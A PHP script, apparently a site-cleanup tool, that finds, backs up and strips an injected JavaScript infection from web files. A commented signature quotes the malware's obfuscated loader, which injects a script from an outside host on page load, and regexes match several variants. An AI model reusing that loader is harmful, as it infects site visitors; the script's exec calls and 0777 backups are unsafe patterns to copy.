<?

/*
		Author: Konstantin Boyko
		Website: http://justcoded.com
		E-mail: kostya.boyko@gmail.com
		Script purpose: finding and removing instances of virus code
		for the site infected with the virus possibly known as Win32/Wigon.HT
		It adds a piece of code into any JavaScript file and into index PHP, HTML, ASP etc. files
		The piece of code starts with /*GNU GPL/* try{window.onload
		
		Place it into the document root folder of your website and run in the web browser.
		It tries to create a few files in document root:
			- !backup-*timestamp*.tgz : tar.gz archive of the files infected
			- !infected-*timestamp*.txt : the list of the files infected
		Then it tries to clean all the files from the list, make sure you
		have enough permissions for script to update the files.
		
		Released for free with no gurantee. Use it on your own risk. Any questions - contact me,
		will try to help.
		
		The author thanks Martin Macdonald for publishing the script at http://www.seoforums.org
		and Charles Abbott for suggestions on script optimization
		
		modify lines 161
*/
	
set_time_limit(0);
ob_start();

$current = time();

function pa($val, $stop = false)
{
	echo "<pre>".htmlentities(print_r($val, 1))."</pre>";
	if ($stop) exit;
}

/* START create_distributive function */

function create_distributive($pathes, $file)
{
	if (empty($pathes)) return;
	
	set_time_limit(0);
	
	$file_tpl = str_replace('.tar.gz', '##part_num##.tar.gz', $file);
	$cmd[0] = 'tar -czvf '.dirname(__FILE__).'/'.$file_tpl ;
	$parts = 1;
	
	foreach ($pathes as $path)
	{
		$path = str_replace('/ROOT/', '/', $path);
		
		if (empty($cmd[$parts])) {
			$cmd[$parts] = $cmd[0];
		}
		
		$cmd[$parts] .= ' '.$path;
	}
	//pa($cmd,1);
	
	unset($cmd[0]);
	
	foreach ($cmd as $part => $cmd_part)
	{
		$search = '##part_num##';
		$replace = '_part'.$part;
		
		if ($parts == 1) $replace = '';
		
		$cmd_part = str_replace($search, $replace, $cmd_part);
		$_file = str_replace($search, $replace, $file_tpl);
		
		exec ($cmd_part, $output, $ret);
		
		if($ret == 0)
		{
			echo $_file.' was created successfully <br />';
			chmod(dirname(__FILE__).'/'.$_file, 0777);
		}
		else
		{
			pa($cmd_part);
			pa(array($output, $ret));
			pa('BACKUP failed...');
		}
		break;
	}
}

/* END create_distributive function */


/* START process_dir function */

function process_dir($dir, $recursive = FALSE)
{
	global $count;
	global $limit;
	
	$shell = isset($_GET['shell']) ? true : false;
	
	if (is_dir($dir))
	{
		if ($limit && $count >= $limit) return array();
		
		for ($list = array(), $handle = opendir($dir); (FALSE !== ($file = readdir($handle)));)
		{
			if (($file != '.' && $file != '..') && (file_exists($path = $dir.'/'.$file)))
			{
				if (is_dir($path) && ($recursive))
				{
					$list = array_merge($list, process_dir($path, TRUE));
				}
				else
				{
					$entry = array('filename' => $file, 'dirpath' => $dir, 'path' => $path);
					
					do
					{
						if (!is_dir($path))
						{
							if ($result = check_file($entry, $shell)) {
								$list[] = $result;
							}
							break;
						}
						else
						{
							break;
						}
					}
					while (FALSE);
				}
			}
		}
		
		closedir($handle);
		return $list;
	}
	else
	{
		return FALSE;
	}
}

/* END process_dir function */

$count = 0;

/* START check_file function */

function check_file($file, $shell=false)
{
	global $count;
	global $current;
	
	$ptrn = "/(php|html|shtml|htm|js|tpl|inc)$/";
	
	$virus_string = "this.Y=\"\";var X;if(X!='E')";
#	$virus_string = "<script>";
#	$virus_string = "var O=new Array();var NK=new Date();var kZ='';var a='';function W(){this.uk=";
#	$virus_string = '/*GNU GPL*/ try{'; // try{window.onload = function(){var X08yhffhg7xkxf = document.createElement('script');X08yhffhg7xkxf.setAttribute('type', 'text/javascript');X08yhffhg7xkxf.setAttribute('id', 'myscript1');X08yhffhg7xkxf.setAttribute('src', 'h)(@t))!t#)p@:&&#$#/^@!@/!)t($r&a)$)v$i)a)@)n&-$@@(c##^o$m(&.$u$(&)n(&i(v^@i$s!(@i)@o$&^n)$&$.^(!c@@#&o!$m!$^@.&!r@^$o&!$@b)$(^t!e&&x!-)$c)#)$o)^$m!!$.@$b^)l&@(u)&(@e#)j)^a!c#&k$!@i$(!n&))^(.!#r^$^u!!)^:(!8&#0$8^!!0#@$/@^#n^$o#&!v@!!i@#@n)k))y!(#.@$c&#(^#z)@#/###^n^!o!(^(v)))$#i)!&)n@^)k!y^)^.^(c(!@z!!^/#!)c&@#d)i&^s$$(c$^o&(u@!n$)&t(!.@$!c&$)o$m!&$/$@$w&o)#r)##d(!$!@p)!r@@$e)$s&#s($.@&&c&)))o@&m@(/&#^g^^@(o@o^!g!)l^!e#^#^.)&!c$!o$#&&&m^$#/^(@&'.replace(/\$|&|\!|\)|@|#|\(|\^/ig, ''));X08yhffhg7xkxf.setAttribute('defer', 'defer');document.body.appendChild(X08yhffhg7xkxf);}} catch(e) {}";
	
	if (preg_match($ptrn, $file['filename']))
	{
		if ($shell) {
			$execoutput = exec("fgrep -l '{$virus_string}' ".escapeshellarg($file['path'])); //EDIT added escapeshellarg()
			$found = ($execoutput && $file['filename'] != 'curevir.php');
		} else {
			$contents = file_get_contents($file['path']);
			$found = (strpos($contents, $virus_string) !== false && $file['filename'] != 'curevir.php');
		}
			
		if ($found)
		{
			if ($count % 50 == 0) {
				pa($count.' passed...');
				ob_flush();
				flush();
			}
			
			$fp = fopen(dirname(__FILE__).'/!infected-log-'.$current.'.txt', 'ab');
			fwrite($fp, $file['path']."\n");
			fclose($fp);
			
			$count++;
			return $file;
		}
	}
	
	return false;
}

/* END check_file function */


/* START backup function */

function backup_files($files)
{
	pa("START BACKUP:");
	
	$paths = array();
	
	foreach ($files as $file) {
		$paths[] = $file['path'];
	}
	
	global $current;
	create_distributive($paths, '!backup-'.$current.'.tgz');
	
	pa("END BACKUP!");
	ob_flush();
	flush();
}

/* END backup function */


/* START cure_file */

function cure_file($file)
{
	pa("Trying to cure ".$file['path']);
	
	$contents = file_get_contents($file['path']);
	
	$js_regexp = '/\.js$/';
	
	$is_js = false;
	
	if (preg_match($js_regexp, $file['filename'])) $is_js = true;
	
	//pa($contents); this.Y="";var X;if(X!='E')
	
	$ptr_js = '/\s*' . 'this\.Y="";var\sX;if\(X!=.E.\)' . '(.*)' . "M=null\};" . '$/is';
	$ptr_html = '/\s*' . '<script>this\.Y="";var\sX;if\(X!=.E.\)' . '(.*)' . "M=null\};<\/script>\s*(<!--.*-->)*" . '$/is';

#	$ptr_js = '/\s*' . "var\sO=new\sArray\(\);var\sNK=new\sDate\(\);var\skZ='';var\sa='';function W\(\)\{this\.uk=" . '(.*)' . "x_='';" . '$/is';
#	$ptr_html = '/\s*' . "<script>var\sO=new\sArray\(\);var\sNK=new\sDate\(\);var\skZ='';var a='';function W\(\)\{this\.uk=" . '(.*)' . "x_='';<\/script>\s*(<!--.*-->)*" . '$/is';
#	$ptr_js = '/\s*' . '\/\*GNU\sGPL\*\/\stry\{window\.onload' . '(.*)' . '\{\}' . '$/is';
#	$ptr_html = '/\s*' . '<script>\/\*GNU\sGPL\*\/\stry\{window\.onload' . '(.*)' . '\{\}<\/script>\s*(<!--.*-->)*' . '$/is';
#	$ptr_js = '/\s*\/\*GNU\sGPL\*\/\stry\{window\.onload(.*)\{\}$/is';
#	$ptr_html = '/\s*<script>\/\*GNU\sGPL\*\/\stry\{window\.onload(.*)\{\}<\/script>\s*(<!--.*-->)*$/is';
	
	if ($is_js) {
		$contents_new = preg_replace($ptr_js, "\n", $contents);
	} else {
		$contents_new = preg_replace($ptr_html, "\n", $contents);
	}
	
	//chmod($file['path'], 0777);
	
	$fp = fopen($file['path'], 'wb');
	
	$success = false;
	
	if (fwrite($fp, $contents_new)) $success = true;
	
	fclose($fp);
	
	if ($success)
		echo "<strong>SUCCESS</strong>";
	else
		echo "<strong style=\"color:red\">FAILED!</strong>";
	
	ob_flush();
	flush();
}

/* END cure_file */


/* START save_list function */

function save_list($files)
{
	global $current;
	$fp = fopen(dirname(__FILE__).'/!infected-'.$current.'.txt', 'wb');
	
	foreach ($files as $file){
		fwrite($fp, $file['path']."\n");
	}
	
	fclose($fp);
}

/* END save_list function */

#echo 1;
$limit = isset($_GET['limit']) ? $_GET['limit'] : 0;
#echo 2;
$current_dir = dirname(__FILE__);
#echo 3;
#echo '<br>' . __FILE__ . '<br>';
#echo $current_dir."<br>";
#echo 4;
$files = process_dir($current_dir, true);
#print_r($files);
#echo 5;
save_list($files);
#echo 6;
pa('TOTAL: '.$count);
#echo 7;
backup_files($files);
#echo 8;
foreach ($files as $file) {
	cure_file($file);
}
#echo 9;
ob_end_flush();
flush();

?>